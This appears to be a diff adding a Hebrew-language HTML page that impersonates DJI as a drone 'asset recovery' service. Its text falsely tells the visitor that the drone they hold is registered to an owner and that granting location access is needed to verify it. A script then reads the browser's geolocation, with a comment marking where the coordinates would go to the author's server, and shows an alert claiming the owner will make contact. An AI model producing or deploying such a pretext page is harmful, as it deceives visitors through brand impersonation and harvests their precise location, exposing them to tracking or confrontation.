@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DJI - Device Status</title>
+    <style>
+        body { font-family: 'Helvetica Neue', Arial, sans-serif; background-color: #f7f7f7; color: #333; text-align: center; margin: 0; padding: 20px; }
+        .container { max-width: 500px; margin: 50px auto; background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        h1 { font-size: 24px; color: #000; }
+        p { color: #666; line-height: 1.6; }
+        button { background-color: #000; color: #fff; border: none; padding: 15px 30px; font-size: 16px; cursor: pointer; border-radius: 4px; margin-top: 20px; width: 100%; }
+        button:hover { background-color: #333; }
+        .footer { margin-top: 30px; font-size: 12px; color: #999; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>מערכת איתור רחפן</h1>
+        <p>הרחפן שברשותך מוגן תחת מערכת האבטחה של DJI ומקושר לחשבון הבעלים. כדי לאמת את הסטטוס ולתאם העברה מאובטחת, נדרשת הרשאת מיקום.</p>
+        
+        <button onclick="getLocation()">אמת מיקום והמשך</button>
+        
+        <div class="footer">DJI Care & Asset Recovery Service</div>
+    </div>
+
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    // כאן תשלח את הנתונים לשרת שלך (Firebase/API)
+                    alert("המיקום נשלח בהצלחה. בעל הרחפן יצור איתך קשר בהקדם.");
+                }, function(error) {
+                    alert("נדרשת הרשאת מיקום כדי להמשיך בתהליך.");
+                });
+            }
+        }
+    </script>
+</body>
+  </html>
+  
